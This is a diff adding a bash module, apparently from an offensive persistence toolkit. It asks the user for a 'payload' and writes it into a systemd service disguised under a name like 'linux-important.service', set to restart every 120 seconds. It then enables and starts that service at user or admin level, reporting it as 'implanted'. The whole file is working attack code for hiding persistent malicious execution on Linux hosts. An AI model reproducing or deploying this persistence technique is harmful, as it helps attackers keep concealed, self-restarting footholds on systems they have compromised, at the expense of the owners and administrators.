@@ -1,0 +1,68 @@
+#!/usr/bin/env bash
+
+# --- all vars are exported in main script line:71 --- 
+# shellcheck disable=SC2154
+
+# --- Storing all admin systemd unit paths into "admin_paths" array ---
+mapfile -t admin_units < <(systemd-analyze unit-paths --system) 
+admin_paths=$(printf "${RED}[+]${EOC} %s\n" "${admin_units[@]}")
+# --- Storing all user systemd unit paths into "user_paths" array --- 
+mapfile -t user_units < <(systemd-analyze unit-paths --user)
+user_paths=$(printf "${RED}[+]${EOC} %s\n" "${user_units[@]}")
+# --- here diff uses process substitution to compare via strings not via temp files(diff -y a.txt b.txt) ---
+echo -e "\tSystem units paths\t\t\t\t\t\tUsers units paths " && diff -y <(echo "$admin_paths") <(echo "$user_paths") 
+
+if [[ "$priv_status" == "is_su" ]]; then
+    echo -e "${RED}[+]${EOC} U are SU your payload will be implanted in systemd level "
+    read -rp $'\033[0;91m[*]\e[0m Enter custom path to script or enter custom payload > ' su_systemd_payload
+    if [[ -z "$su_systemd_payload" ]]; then
+        echo -e "\n${RED}[x]${EOC} Payload cannot be empty \n" && menu
+    else
+        su_systemd_file="$HOME/.config/systemd/user/'$random'-linux-important.service"
+# --- simple systemd service with custom payload ---
+cat << EOF > "$su_systemd_file"
+
+[Unit]
+Description=Linux Important Service N$random
+After=network.target
+
+[Service]
+Type=simple
+ExecStart=$su_systemd_payload
+Restart=always
+RestartSec=120
+
+[Install]
+WantedBy=default.target
+EOF
+    sudo systemctl daemon-reload && \
+    systemctl enable "$random"-linux-important.service && \
+    systemctl start "$random"-linux-important.service && \
+    echo -e "\n${RED}[+]${EOC} (\"ExecStart=$su_systemd_payload\") successufly implanted in \"$su_systemd_file\" and stared";
+    fi
+else
+    echo -e "\n${RED}[!]${EOC} Current user (\"$USER\") cannot implant system deamon service on system level \n"
+    read -rp $'\033[0;91m[*]\e[0m Enter custom path to script or enter custom payload > ' user_systemd_payload
+    if [[ -z "$user_systemd_payload" ]]; then
+        echo -e "\n${RED}[x]${EOC} Payload cannot be empty \n" && menu
+    else
+        user_systemd_file="$HOME/.config/systemd/user/'$random'-linux-important.service"
+cat << EOF > "$user_systemd_file"
+[Unit]
+Description=Linux Important Service N$random
+After=network.target
+
+[Service]
+Type=simple
+ExecStart=$user_systemd_payload
+Restart=always
+RestartSec=120
+
+[Install]
+WantedBy=default.target
+EOF
+    systemctl --user daemon-reload && \
+    systemctl enable "$random"-linux-important.service && \
+    systemctl start "$random"-linux-important.service && \
+    echo -e "\n${RED}[+]${EOC} (\"ExecStart=$user_systemd_payload\") successufly implanted in \"$user_systemd_file\" and stared";
+fi; fi;
